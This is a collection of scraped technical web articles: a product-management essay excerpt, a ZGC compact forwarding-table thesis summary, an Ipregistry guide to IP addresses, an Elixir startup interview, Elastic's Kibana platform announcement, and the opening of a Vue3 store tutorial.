interrelatedness is extremely important to consider.</p><p><a href="#top">Top</a></p><h2>Opportunities vs. Interventions</h2><p>One challenge with dividing things into problems versus solutions is something that anyone who has worked in product development understands: almost every problem is a nested solution to a higher-level problem. For example, when I have issues with how we’re going to generate revenue for the company, that’s a problem. But it’s also a solution to some other higher-level mission for the company about why you exist, the change that you hope to engender, or how you want to create long-term growth and value for your company. Similarly, a low-level issue could involve improving the performance of a particular page. That’s also a problem, and it’s a perfectly compelling and interesting problem, but it’s actually a solution for some higher level goal that you’re pursuing.</p><p>The challenge is that organizations often struggle to define who owns problems and who owns solutions. The debate will never be resolved completely because at its heart, it’s a debate over how things are decomposed. It’s a debate over who decides how those things are all linked together. One test I use to tease out a problem’s full connection to what’s going on within the company is to imagine some really smart person in the back of the room continually asking, “Why,” or “What are we hoping to achieve with this?”</p><p>Now, opportunities and interventions are a little different, because the word intervention implies that we’re somehow doing something that may change behavior for our benefit or that may actually change behavior in a way that we didn’t expect—or which might not even be beneficial for the company.</p><p>And it implies a temporary nature to our efforts. It implies that we might decide not to continue intervening that way. It’s a useful framing for how people think about delivering features. They imagine a level of permanence to what they’re doing, that it’s going to stick around forever and that they need to perfect what they’re putting out there in the world. That kind of pressure on what you’re doing causes a lot of problems.</p><p>Similarly, with any product, there is guaranteed to be a steady stream of problems to solve, but just because a problem exists (or just because customers are complaining about something), this doesn’t necessarily mean that there’s value in solving that problem.</p><p>You also expose this by framing things as opportunities. For example, we have an opportunity to make customers more successful at something, or we have an opportunity to unlock this part of the market. Yes, you could also frame that as a “problem.” However, this lens reveals that there’s not really one underlying binary problem that is either solved or isn’t solved. </p><p>Perhaps you’ve have or haven’t successfully realized opportunities or explored a certain area. We learn more about the opportunity as we dig into it. You can incrementally capture value from a particular opportunity. Those are characteristics of problems that are hard to talk about. And things will also pop up that don’t strike anyone as a genuine problem.</p><p>Let’s take a not uncommon example: a status quo exists, and people are generally happy with how things are. You could look at this and think there’s not really much you can do there. Now, opportunities imply that there may be ways shift the paradigm from how you’re currently working. </p><p>Thinking about prioritizing problems to solve, it actually feels a little different to when you’re prioritizing opportunities to capture additional value. This perspective tends to inspire people to think a little bit more broadly about what they’re doing and can actually inspire people to be a little bit more strategic about what they’re doing. Framing situations in terms of opportunities and interventions can go a really long way in terms of getting your team to be more impact-focused.</p><p><a href="#top">Top</a></p><h2>Danger of premature convergence</h2><p>So what is premature convergence? Premature convergence is trying to zero in on a solution (or decision) earlier rather than later, potentially too early. Now, this can obviously be a little tough to judge. There’s an ideal spot that that’s probably a range for most of your efforts. But the really important thing is that our intuition often drives us to converge on a solution earlier than would be optimal. This happens because we don’t like uncertainty. We want plans, we want to be able to say …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry"><hr>

<p><em>The work presented here is performed as part of the <a href="https://inside.java/2020/06/12/joint-research-projects/">joint research project between Oracle, Uppsala University and KTH</a>. Follow the blog series here at inside.java to read more about the JVM research performed at the Oracle Development office in Stockholm.</em></p>

<hr>

<p>This is a short description about my work on garbage collection that I did for my master thesis. This work was done in collaboration with <a href="https://www.oracle.com/">Oracle</a> which gave me an opportunity to work with brilliant minds on challenging problems. I want to direct a special shoutout to my mentors at Oracle, <a href="https://inside.java/u/PerLiden/">Per Lidén</a> and <a href="https://inside.java/u/ErikOsterlund/">Erik Österlund</a>.</p>

<p>To allow fast allocation in garbage collected environments, a common approach is to use bump pointer allocation. Bump pointer allocation uses a pointer to the first available byte in memory that is monotonically increased as we continue to allocate objects. While this scheme allows fast allocation it comes with the caveat that the free memory must be kept continuous. To keep the free memory continuous, many garbage collectors move objects around in memory to compact them, thereby avoiding fragmentation, which can be seen in the figure below. This is typically handled in a process where all live objects are moved off of a page which is then free’d. This permits clearing a page in O(live) objects, which is typically a small number (relatively speaking) since most newly created object tend to die pretty quickly.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/heapgc_defrag.png" alt="Defragmentation during GC"></p>

<p>The Z Garbage Collector (ZGC) is a new moving concurrent garbage collector in OpenJDK (the thing that probably runs your Java application) [1, 2]. ZGC moves objects around, to combat memory fragmenation, without stopping the application.
This imposes additional overhead on an application in the form of tracking objects’ movements, so that all pointers to them can eventually be updated to the new locations. Usually in GC parlance this is referred to as forwarding information.</p>

<p>ZGC uses an auxiliary forwarding table – optimised for fast look-up, at the cost of additional memory use. This forwarding table is stored outside of the Java heap, referred as off heap-allocation. Any off-heap allocation or keeping old object after moving them is to be considered as memory overhead since it is strictly needed for the JVM and not the actual Java application. ZGC suffers from pathological cases where the size of its forwarding information can become very large, theoretically, as big as the heap itself. If we dimension an application for the pathological case this would be a waste of resources, since the memory usage is usually significantly less. This can make it hard to determine an application’s memory requirements.</p>

<p>This risk for large memory overhead is not only a theoretical concern, but can be observed in real programs. Below is a plot depicting the memory overhead for an internal benchmark application called BigRamTester at Oracle, which shows 35% memory overhead. The source code for that application can be found in <a href="https://bugs.openjdk.java.net/browse/JDK-8152438">this issue </a> as an attachment.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/bigram.png" alt="Benchmark Revealing Large Memory Overhead"></p>

<p>Storing forwarding information for each relocated object from addresses A (the from-address) to B (the to-address), costs approximately 128 bytes (64 bytes for each from/to-address), can be implemented computationally efficient but at the cost of additional memory overhead (as shown above). As part of my thesis work, we propose a new design for forwarding tables that maps several sparesly populated pages (i.e., with few live objects) onto a single new page in a way that allows the to-address to be calculated using the from-address and liveness information. The design results in a compressed forwarding table that incurs a theoretical worst-case memory overhead of &lt; 3.2%.</p>

<p>In ZGC, there may be contention between application threads and garbage collector threads of relocating objects. The contention results in nondeterministic addresses to which objects are relocated to. The new design requires <em>deterministic addresses</em> so that we can calculate the new address given some set of information. Assume that we have an old page X, whose objects will be relocated to the new page Y. We achieve deterministic addresses, if we copy the objects to Y in the order we encounter them when traversing the live map from the beginning to the end, in ascending order.</p>

<p>The new design divides pages into Q amount of chunks. A chunk holds the amount of preceding living objects <em>before</em> that chunk. To get the size of previously living objects you will use the associated chunk and scan the live map for the addresses who wasn’t covered by the chunk. This allows X to be computed efficiently and allows the old page to be freed as soon as all objects have been relocated, at the cost of some space. An example of dividing a page into chunks is depicted below.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/chunks.png" alt="Chunks"></p>

<p>Each page divider corresponds to one chunk’s live map coverage. In the example, an object to be relocated lives on the third page which covered by the third chunk (the green arrow). To find the address we do not have to scan the previous chunks since the <em>live bytes</em> field is describing the amount of live bytes of all preceding chunks (the red arrow). Finding all living objects (and their size) preceding the green object within the chunk, can be found in the live map (the yellow arrow).</p>

<p>This design results in a simple logic in order to calculate the new address, which in pseudocode would be express as:</p>

<div><div><pre><code><span>inline</span> <span>uintptr_t</span> <span>ZCompactForwarding</span><span>::</span><span>to_address</span><span>(</span><span>uintptr_t</span> <span>from_address</span><span>)</span> <span>{</span>
  <span>uintptr_t</span> <span>to_page_start_address</span>    <span>=</span> <span>to_page_start_address</span><span>(</span><span>from_address</span><span>);</span>
  <span>uintptr_t</span> <span>live_bytes_before_chunks</span> <span>=</span> <span>live_bytes_before_chunks</span><span>(</span><span>from_address</span><span>)</span>
  <span>uintptr_t</span> <span>live_bytes_on_chunks</span>     <span>=</span> <span>live_bytes_on_chunks</span><span>(</span><span>from_address</span><span>);</span>

  <span>return</span>
    <span>to_page_start_address</span> <span>+</span>
    <span>live_bytes_before_chunk</span> <span>+</span>
    <span>live_bytes_on_chunks</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The implementation was shown to have a maximum of &lt; 3.2% memory overhead. I used the DaCapo benchmarks suite and the SPECjbb2015 benchmark to evaluate the impact of the design on execution time, given that forwarding addresses must now be computated, as opposed to looked up. Naturally, we expected some performance degradation.
The results from the benchmarking show an statistically significant average performance degradation of approximately 2%, for the new design. Notably, many programs in DaCapo were not effected at all. Two DaCapo programs saw performance improvements at 5.69% and 22.42%, respectively, for the new design.</p>

<p>I haven’t implemented all optimizations on my list (yet). But I’m fairly hopeful that decrease in memory footprint and predictable overhead outweighs the increase in execution time, as incidated by the measurements. This could mean that the work you’d just read about will hopefully find its way into OpenJDK. Only time will tell.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><p><img src="https://images.unsplash.com/photo-1586769852836-bc069f19e1b6?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1280&amp;height=640&amp;q=80" alt="What can I learn from an IP address?" title="What can I learn from an IP address?"></p><div><p>There are common questions and assumptions about what information you can find regarding an IP address. This publication is a detailed guide on the IP address information you can discover.</p><h2 id="basics">Basics</h2><p>An IP address is very similar to a physical street address. It allows targeting a destination. The destination is another device, connected to the public Internet or a private network. For instance, when you open a page on your browser to read this page, the device that runs your browser connects to multiple IP addresses in order to fetch the content you see (e.g. text, images, styles).</p><h2 id="types-of-ip-addresses">Types of IP Addresses</h2><p>The amazing Internet we all know started with the use of IPv4 addresses. An IPv4 address looks like <code>178.45.234.2</code>. There exist 4,294,967,296 (2<sup>32</sup>) addresses in total. That's less than the number of people on earth. When originally deployed in 1983, it was assumed that about 4 billion IP addresses would be more than sufficient for the different use cases the Internet will bring. Turning back to 2020, all IPv4 addresses are exhausted.</p><p>As soon as 1990, the <em>Internet Engineering Task Force</em> (IETF) began addressing the IPv4 address exhaustion and created a new protocol named IPv6. While a typical IPv4 address looks like <code>178.45.234.2</code>, an IPv6 address looks like <code>2001:0ab8:0000:0000:2000:ff00:0042:2333</code>. The most important difference is that IPv6 allows much more IP. It increases the allocation range from 4.2 billion to 340,282,...,000 (2<sup>128</sup>) addresses. In case you were wondering, this large number is 340 Undecillion.</p><p>While IPv6 enables every single Internet-connected device to have its own IP address, IPv6 and IPv4 are not compatible. As a consequence, the adoption has been slower than what IETF and others had hoped for. Here is a chart from Google (updated every week) that summarizes IPv6 adoption:</p><h2 id="dynamic-vs-static-ip-addresses">Dynamic vs Static IP Addresses</h2><p>Due to the limited range space of IPv4 (about 4.2 billion) and because the IPv6 adoption is slow, most Internet users are using dynamic IP addresses. This means that your phone, router, etc. may have its IP address changed periodically. This is made in a transparent manner by your <em>Internet Service Provider</em> (ISP). In most cases you don't even notice the change. Unless you're hosting a server this doesn't impact you.</p><p>If you stumbled upon a dynamic allocation because you are hosting a server node and your dynamic IP address makes it hard for people to connect to your server, check out a Dynamic DNS service such as <a href="http://dyn.com/" target="_blank" rel="noopener nofollow">dyn.com</a>.</p><p>On the contrary, most businesses have what's called a static IP address. While a dynamic IP address may change, a static IP address does not. In other words, static IP addresses are great for servers such as email or web servers, because users are unlikely to be redirected due to a change in the IP address. This also makes it easier for devices to locate a server worldwide and remote access for devices on a closed network is much easier when utilizing a static IP address.</p><p>The downside of static IP addresses is that they cost more than their dynamic counterparts. Another point to remember is that they are considered less secure than dynamic IP addresses. This is because hackers and other people trying to get into your system don't have to figure out what is your new IP. Once you get a static IP address it remains to you as long as you pay. As such, all the hacker needs to do is to identify your IP address once. To get around that problem, many organizations that use static IP addresses invest in additional security systems to protect their servers. While this is generally effective and more appropriate, the system becomes more expensive than those using dynamic IP addresses.</p><h2 id="public-vs-private-ip-addresses">Public vs Private IP Addresses</h2><p>Most IP addresses are public. Using a public IP address, people from all over the world can connect to it (just like you connected to a number of IP addresses to read this page). However, not all IP addresses are public. There are some ranges that have been set aside for private use. A great example is if you have a router you connect your phone or computer to.</p><p>There exist 3 private IP ranges for IPv4:</p><ul><li><code>10.0.0.0</code> – <code>10.255.255.255</code>.</li><li><code>172.16.0.0</code> – <code>172.31.255.255</code>.</li><li><code>192.168.0.0</code> – <code>192.168.255.255</code>.</li></ul><p>In IPv6, the IP block <code>fc00::/7</code> is the equivalent of the previous IPv4 private ranges. For instance, <code>fdf8:f53b:82e4::53</code> is a <em>Unique Local Addresse</em> (ULA). These addresses are reserved for local use in home and enterprise environments and are not public address space. These addresses might not be unique, and there is no formal address registration. Packets with these addresses in the source or destination fields are not intended to be routed on the public Internet but are intended to be routed within the enterprise or organization.</p><h2 id="full-ip-address-information">Full IP Address Information</h2><p>The reason that satisfied developers but also small and large companies use Ipregistry is because of the extensive and incredible information you can learn about IP addresses. To share an example, I looked up my IP address when I was in New York and here is an example of what Ipregistry provided:</p><p><img src="https://ipregistry.co/assets/blog/ipregistry-data-example.png" alt="Ipregistry data example for IP 161.185.160.93" title="Ipregistry data example for IP 161.185.160.93"></p><p>Most of the information that Ipregistry returns is straight forward. However, it should be taken into account that if you look up the latitude/longitude, you won't find the exact location where I was. Why are coordinates not accurate? IP geolocation is aimed at the city or postal code level, not at the exact physical address.</p><h2 id="common-questions-about-ip-information">Common Questions about IP information</h2><h3 id="how-do-i-look-up-information-on-a-specific-ip-address%3F">How do I look up information on a specific IP address?</h3><p>Ipregistry is all about this. Once you <a href="https://dashboard.ipregistry.co/signup" target="_blank" rel="noopener nofollow">create an account</a>, you can lookup information from our dashboard or by using our API. Simply enter the IP address, and we'll take care of the rest.</p><h3 id="how-can-i-use-ip-address-information%3F">How can I use IP address information?</h3><p>You can do incredible things with this information. We have amazing customers leveraging IP address info to provide geo-specific content, perform security research, analyze their customers and habits based on location. IP geolocation information is used in several contexts. Here are more concrete examples:</p><ul><li>Showing prices in user local currency.</li><li>Sending location-based offers.</li><li>Personalize content based on your audience.</li><li>Find out about the time zone your users are located.</li></ul><p>Since Ipregistry also includes security information and supports user-agent parsing, you can:</p><ul><li>Block automated visits from hosting providers.</li><li>Block Proxy and Tor users.</li><li>Predict chargebacks.</li><li>Identify bad actors and bots.</li><li>Highlight strange web activities.</li><li>Suggest Native App Binary based on user Operating System.</li></ul><h3 id="can-i-track-the-physical-location-of-a-phone-based-on-its-ip-address%3F">Can I track the physical location of a phone based on its IP address?</h3><p>No. IP geolocation can help to detect whether a given IP address is used by a mobile device and provide a general idea of where this phone is. However, you cannot track it down to the table it is sitting on. If you value privacy, this should come as a relief.</p><p>Have questions regarding IP address information? we would love to hear from you. We are constantly learning and developing incredible tools to help our customers make the most of the Internet and the data out there. We would love to see what ideas you have.</p></div></div></section><p>Get started with 100,000 free lookups: <a href="https://dashboard.ipregistry.co/signup"> <span>sign up</span></a></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this article, we’re interviewing Nathan Johnson, one of the co-founders of <a href="https://beta.venu.tv/">Venu</a>, a community-driven online marketplace for virtual events. Venu is written in Elixir and has recently gone into beta, so we thought it would be an excellent opportunity to learn more about the choice and advantages of using Elixir for one’s startup. If you want to learn about their stack and how Phoenix LiveView enabled them to build their app quickly (3 months of part-time work), read on.</p><h3 id="interview-with-nathan-johnson">Interview with Nathan Johnson</h3><h4 id="could-you-tell-us-more-about-your-company-and-your-role-there%3F">Could you tell us more about your company and your role there?</h4><p>Sure thing. Venu is a marketplace for live events/experiences. It allows organizers to create/sell tickets, set up schedules and multi-track events, and live stream those events in the same vein as Twitch or Mixer. Its focus is on conferences but can be used for any live-streamed content.</p><p>I am one of the co-founders along with Brodey Newman and Dillon Chanis. I do a good bit of the backend development/integrations.</p><p><img src="https://serokell.io/files/67/675pkgmd.team2.jpg" alt="Venu team"></p><hr><center><i>
	The co-founders of Venu.</i></center><h4 id="could-you-talk-about-the-stack-of-venu%3F-any-particular-elixir-libraries-that-you-want-to-feature%3F">Could you talk about the stack of Venu? Any particular Elixir libraries that you want to feature?</h4><p>Our stack is Elixir + Phoenix LiveView + Alpine.js + Tailwind CSS hosted on Gigalixir with a couple of AWS services (S3/CloudFront).</p><p>LiveView has enabled us to build the app in about three months part-time and is definitely worth mentioning. It can be a bit of a learning curve, and new things are always being added to it, but the velocity it gives you is well worth it. You don’t have to worry about the plumbing of how data gets from your backend to the frontend so you can focus primarily on the UI/presentation layer. LiveView isn’t a 1.0 release yet, so there have been some challenges with new releases coming out and some bugs, but overall it’s been fantastic.</p><h4 id="do-you-use-any-erlang-libraries-in-elixir-code%3F-if-so%2C-are-there-any-you-would-like-to-feature%3F">Do you use any Erlang libraries in Elixir code? If so, are there any you would like to feature?</h4><p>Nothing third-party, but some of our prototype streaming code is using the raw <code>:ssl</code> and <code>:gen_tcp</code> libraries.</p><h4 id="do-you-use-distributed-erlang-functionality-for-cross-node-message-passing%3F-why-or-why-not%3F">Do you use distributed Erlang functionality for cross-node message passing? Why or why not?</h4><p>Currently, we don’t use cross-node messaging because we can run everything off a single replica, but we built our app with that in mind. For instance, our code that manages the state of a live stream, users connected, etc. is all GenServers, so if we need to scale out, we can transition from a single node to multiple nodes with message passing easily.</p><h4 id="do-you-have-non-beam-code-in-your-codebase%3F-if-so%2C-how-much-and-why%3F">Do you have non-BEAM code in your codebase? If so, how much and why?</h4><p>Only some of our front end is non-BEAM because we didn’t want to put things like which modals/dropdowns were open in our LiveView state. We’ve considered writing some Rust for the live streaming as well, but Elixir works pretty well for that.</p><h4 id="where-is-elixir-great-to-use-and-where-does-it-fall-short-in-your-stack%3F">Where is Elixir great to use and where does it fall short in your stack?</h4><p>Elixir has been great for everything so far. A lot of our codebase right now is a simple Phoenix app managing some basic content, but even the complex stuff like payouts via Stripe and the live streaming has been trivial as well. The only thing we had any real issues with was deployment, but we’ve been using Gigalixir and it makes that process extremely simple.</p><h4 id="what-was-the-biggest-challenge-you%E2%80%99ve-overcome-while-working-on-this-project%3F-if-elixir-helped-you-to-solve-it%2C-how%3F">What was the biggest challenge you’ve overcome while working on this project? If Elixir helped you to solve it, how?</h4><p>We had a couple of major challenges. The first one: an ongoing issue with time zones that is not that fun to talk about but is easily solved with Elixir’s Timex library. The other one was handling real-time content, which is pretty interesting.</p><p>For our app, we need to keep everyone in sync when viewing/messaging on a live stream. Elixir definitely helped solve this in a simple way. Phoenix has built-in Pub/Sub functionality that allows us to broadcast and subscribe from our LiveView instances. So, we can easily publish updates for when a stream starts/stops or when new messages come in, and the UI updates in real-time because of the magic of LiveView.</p><p><img src="https://serokell.io/files/60/60wm93ma.venu_meta.png" alt="60wm93ma.venu_meta.png"></p><hr><center><i>You can try out Venu by <a href="https://beta.venu.tv/">signing up</a> for its closed beta. </i></center><h4 id="are-you-satisfied-with-the-result%3F">Are you satisfied with the result?</h4><p>Absolutely.

It’s also a good way to get introduced to the joy of Elixir programming.</p><hr><p>We want to thank Nathan for taking his time to talk with us, and wish the best of luck to Venu and its team!</p><p>If you want to read more about companies using functional programming in production, we suggest you check out our <a href="https://serokell.io/blog/haskell-in-production">Haskell in Production</a> articles or our overview of <a href="https://serokell.io/blog/elixir-companies">the largest Elixir-using companies</a>.</p><p>If you have your own Elixir in production story to tell (both good and bad), we definitely want to hear it!

July 1, 2020 | https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/introducing-a-new-architecture-for-kibana">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>We’re excited to share more details today about a long-running project that the Kibana team has been working on for the past couple of years: the Kibana development platform.&nbsp;
</p><p>If you’re a Kibana plugin developer or enjoy lurking around our GitHub repo, you’ve probably seen mentions of “the new platform.” This is a re-architecture project we’re close to completing that enables the future of Kibana plugin development for both developers at Elastic and the wider Kibana community. So why did we build this? Let’s start with a bit of history.
</p> <p><strong><h2>Kibana 4.0, a modest JavaScript app</h2></strong></p><p>The first “architecture” of Kibana was put together all the way back in 2015, <a href="https://www.elastic.co/blog/kibana-4-literally/">starting with Kibana 4.0</a>. At the time, we had just three apps: Discover, Visualize, and Dashboard. Even more critically, we only had four full-time developers.
</p><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf50f9b7f4bece58d/5ef67b9ca917b92b287f6677/blog-new-kibana-arch-4-0.jpg" data-sys-asset-uid="bltf50f9b7f4bece58d" alt="Kibana 4.0: Not too shabby for only having four full-time developers"></p><p>With such a small team, we reached for familiar libraries and built Kibana around them: Angular.js, Express, and RequireJS. We added Hapi.js and used Hapi’s plugin system to build server-side plugins. On the front end, each application was a separate Angular.js app built on some shared code. Using familiar tools allowed us to iterate quickly, avoid reinventing the wheel, and ship features at a whiplash pace. It worked well!
</p><p>Fast forward a few years and Kibana comprised a whopping 97 plugins and was actively worked on by over 100 Elastic developers. Kibana had become one of the largest open source JavaScript apps in the world. The simple architecture we had built was starting to bow under this weight. Writing cross-application integrations was difficult, unintended breakages were common, development performance was poor, and ramping up new developers on Kibana was difficult.
</p><p>Our patchwork system of solutions had finally taken us as far as it could and it was clear we needed to think again from first principles. A group of Kibana engineers set out to design a new system that could scale with Kibana, our team, and the community: the Kibana development platform.
</p> <p><strong><h2>The Kibana development platform, a grown-up application framework</h2></strong> <strong><h3>Goals</h3></strong></p><p>The primary goal of the Kibana platform project was to increase both the velocity and stability of adding new features. To fulfill this goal, we needed to make Kibana’s codebase easy to change, easy to learn, and easy to thoroughly test.
</p><p>To achieve these goals we produced a list of features that this new architecture should have:
</p><ul><li>Consistent architecture across client and server code</li><li>A small, explicit set of foundational APIs that is separate from plugin code</li><li>Simple and well-defined plugin runtime and execution flow</li><li>Isolated plugins with explicit APIs and dependencies</li><li>Framework-agnostic and futureproof APIs</li><li>Full test coverage</li><li>Type safety</li></ul> <p><strong><h3>Microservices</h3></strong></p><p>One of the key problems with our legacy code was how much it was slowing down individual teams from iterating quickly.
</p><p>The popular microservices trend is often the recommended pattern to reach for when re-architecting a system to solve this problem. By breaking up responsibilities into independent systems with clear boundaries, each team can work within their domains with fewer cross-cutting concerns.
</p><p>Microservices proper aren’t an option for Kibana, which is deployed as a single artifact on millions of our customers’ own machines. Simple deployment and configuration is a goal of all products at Elastic. Breaking up Kibana into smaller, separate deployments would complicate that.
</p><p>However, similar benefits can be realized by enabling strict encapsulation between components. The original Kibana architecture allowed for many components to affect the entire system, often in unexpected ways. By facilitating and enforcing encapsulation with explicit boundaries and dependencies between subsystems, we focused on achieving many of the same benefits without complicating our deployment story.
</p><p>We see the Kibana platform as a hybrid approach: a single artifact that you can download and run on your laptop, but built with explicit boundaries between its pluggable systems.
</p><p>With this design, we avoid the complexity of deploying microservices and handling network failures, while still promoting the isolation between systems that enables teams to move quickly.
</p> <p><strong><h2>Key aspects of the Kibana platform</h2></strong> <strong><h3>Core</h3></strong></p><p>The Kibana core is the root system that boots Kibana, validates configuration, loads plugins, and provides the primitive APIs needed to build a plugin in Kibana. When you run <code>./bin/kibana</code> or load Kibana in your browser this is the system that starts executing first.
</p><p>The core is made up of a set of <strong>services</strong>, each of which provides APIs to plugins at different points of the system’s lifecycle. Core services are always present and cannot be disabled. Anything we consider to be essential to building a Kibana plugin exists as a core service.
</p><p>The underlying implementation details of core services are encapsulated and hidden from plugins. This yields a number of benefits, not the least of which is high test coverage. By only allowing plugins access to purpose-built features, we can ensure that the core’s small API surface is incredibly robust.
</p><p>The core also aims to be framework and technology agnostic. We want this platform to grow with the project for years to come. Locking the entire project into one technology has bitten us in the past (Angular.js, Hapi.js) and is a decision we plan to avoid going forward. When possible, we prefer to provide primitives or well-formed abstractions over specific frameworks. For instance, applications in the Kibana platform can be written using virtually any UI framework (though we prefer React and our EUI library) and our HTTP interface is a very generic abstraction over Hapi.js. This allows plugins to experiment with and adopt new technologies and allows the core to remove underlying frameworks without breaking the interface provided to plugins.
</p> <p><strong><h3>Plugins</h3></strong></p><p>While the core provides the foundation of Kibana, plugins are where the magic happens. Virtually every feature you use in Kibana is built inside of a plugin. In general, a plugin is a group of functionalities that can be toggled on or off to provide features and apps in Kibana.
</p><p>Plugins have access to all of the APIs exposed by core services. But the really neat thing about plugins is that they may have dependencies on other plugins. This allows plugins to integrate at runtime via explicit contracts that these plugins expose to one another. Plugins can expose something as simple as a small integration API or provide a feature-rich service to other plugins. This allows us to keep adding new services to Kibana without expanding the API surface of the core. By baking this feature into the platform’s design, we can make sure that changes to these interfaces are well understood and communicated.
</p><p>So what can a plugin do? Well, they can register HTTP endpoints and UI applications, query and create data in Elasticsearch, and provide generic services to other plugins. In other words, quite a bit.
</p> <p><strong><h3>Lifecycles</h3></strong></p><p>All core services and plugins are organized and executed in the same set of lifecycle stages: setup, start, and stop. Both the client and server execute these lifecycle stages sequentially when starting Kibana.
</p><p>Different sets of functionality are available during each lifecycle stage. It is up to each service and plugin to return the APIs it wishes to expose during these lifecycle stages for other services and plugins to consume.
</p><p>By organizing all of Kibana around these stages, we make reasoning about <em>when</em> code will execute much simpler and have tight control over which features are available to other components at different points in time.
</p> <p><strong><h3>Server and browser</h3></strong></p><p>Up until this point we’ve talked about the core as if it’s a single system. However, that isn’t <em>quite</em> true. In reality, we have a server-side and client-side core. Each follows a similar design but is made up of a slightly different set of services.
</p><p>As you might expect, the server-side services provide typical backend functionality, like HTTP routes, while the client-side services provide frontend functionality, like UI mounting. But while the set of APIs is different, both systems share the same design, patterns, and lifecycle stages.
</p><p>This makes learning how to build a Kibana plugin much simpler. In legacy Kibana, developers had to learn about Hapi’s plugin system on the server and Angular’s module system in the browser. Developers today can learn a single pattern for building plugins that is portable between the two environments.
</p> <p><strong><h2>Results</h2></strong></p><p>Leveraging this design, the Kibana teams have been incrementally migrating their plugins to the Kibana platform APIs over the past several minor versions. Today, we’re happy to report that all applications will be running on the platform as of version 7.9.0 (coming soon).
</p><p>One of the biggest improvements users of Kibana will notice with this change is a much faster navigation experience between applications. We have removed the “loading screen of death” (as some call it) when switching between applications, enabling you to quickly find, analyze, and share your data. In 7.9, you will be able to flip between Dashboard, Maps, Canvas, APM, and all your other favorite Kibana apps nearly instantly! Gone are the days of the loading screen breaking your flow.
</p><p><img src="https://play.vidyard.com/WeKZ5mfwug3ng8gDPjSZgE.jpg" data-uuid="WeKZ5mfwug3ng8gDPjSZgE" data-v="4" data-type="inline" data-autoplay="1" data-loop="1" data-hidden_controls="1" data-muted="0" muted=""></p><p>But this is just the beginning. Developers at Elastic are now able to build features faster, more efficiently, and produce better code. For Kibana users, this translates to more features in every release! No matter which solutions you are using — <a href="https://www.elastic.co/enterprise-search">Elastic Enterprise Search</a>, <a href="https://www.elastic.co/observability">Observability</a>, or <a href="https://www.elastic.co/security">Security</a> — expect the capabilities to grow even faster.
</p> <p><strong><h2>Further reading for plugin developers</h2></strong></p><p>As we’ve rolled out these changes, we’ve introduced significant changes to our experimental plugin API available to non-Elastic plugin developers. If you are a developer that maintains a Kibana plugin, you will need to update your plugin to work with future versions of Kibana. Our incremental approach has led to churn in the experimental API and we generally recommend …</p></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I've built a store implementation that allows name-spaced actions and helps with the separation of concerns. The new Composition API in Vue3 also allows completely new, convenient ways of using it.</p>

<hr>

<p>This article is <a href="https://dev.to/koehr/a-store-implementation-from-scratch-using-vue3-s-composition-api-3p16" rel="nofollow">crossposted on dev.to</a>. Feel free to join the discussion there.</p>

<hr>

<p>At some point I started moving a side project over to <a href="https://github.com/vuejs/vue-next" rel="nofollow">Vue3</a> (which is still in beta). The side project is in a rather early stage and so I decided to rebuild the whole underlying foundation of it from scratch making use of the new possibilities of Vue3, especially of course the composition API.</p>

<h2 id="nuisance">Nuisance</h2>

<p>One nuisance I had was the way I handled state. I didn't use <a href="https://vuex.vuejs.org/" rel="nofollow">Vuex</a> but instead left state handling to a global state class that I added to Vue like <code>Vue.prototype.$store = new StorageHandler</code>. That allowed me to access global state from everywhere within Vue components via <code>this.$store</code> and worked pretty well in most cases.
But when the store grew a bit more complex I wished back some of the features Vuex offers. Especially actions, name-spacing and with them the much better encapsulation of the state. It also adds extra work as soon as you need to access the state from outside Vue, for example in API call logic.</p>

<p>When moving to Vue3 I played with the thought to try <a href="https://github.com/vuejs/vuex/tree/4.0" rel="nofollow">Vuex4</a>. It has the same API as Vuex3 and is meant to be usable as a drop-in when updating a Vue2 application to Vue3. But rather quickly I decided to roll my own, simplified implementation that uses the new Composition API because it would make things much neater. But lets quickly recap first what this Composition API is and how it helped me here:</p>

<h2 id="composition-api-vs-options-api">Composition API vs Options API</h2>

<p>What is the Composition API and what is the Options API? You might not have heard of those terms yet but they will become more popular within the Vue ecosystem as soon as Vue3 is out of beta.</p>

<p>The Options API is and will be the default way to build components in Vue. It is what we all know. Lets assume the following template:</p>

<pre><code>&lt;div&gt;
  &lt;div class="greeting"&gt;{{ hello }}&lt;/div&gt;
  &lt;input v-model="name" placeholder="change name" /&gt;

  &lt;div class="counter"&gt;Clicked {{ clicks }} times&lt;/div&gt;
  &lt;button @click="countUp"&gt;click!&lt;/button&gt;
&lt;/div&gt;
</code></pre>

<p>This is how an Options API example would look like:</p>

<pre><code>const component = new Vue({
    return {
      name 'World',
      clicks: 0
    }
  },
  computed: {
    hello () {
      return `Hello ${this.name}`
    }
  },
  methods: {
    countUp () {
      this.clicks++
    }
  }
})
</code></pre>

<p>This still works the same in Vue3. But additionally it supports a new <code>setup</code> method that runs before initializing all the rest of the component and provides building blocks. Together with new imports this is the Composition API. You can use it side-by-side or exclusively to create your components. In most cased you'll not need it but as soon as you want to reuse logic or simply split a large component into logical chunks, the Composition API comes in very handy.</p>

<p>Here's one way how the example could look like using <code>setup()</code>:</p>

<pre><code>import { defineComponent, computed } from 'vue'

// defineComponent() is now used instead of new Vue()
const component = defineComponent({
  setup () {
    // greeting
    const name = ref('World')
    const hello = computed(() =&gt; `Hello ${name.value}`)
    // counting
    const clicks = ref(0)
    const countUp = () =&gt; clicks.value++

    return { name, hello, clicks, countUp }
  }
}  
</code></pre>

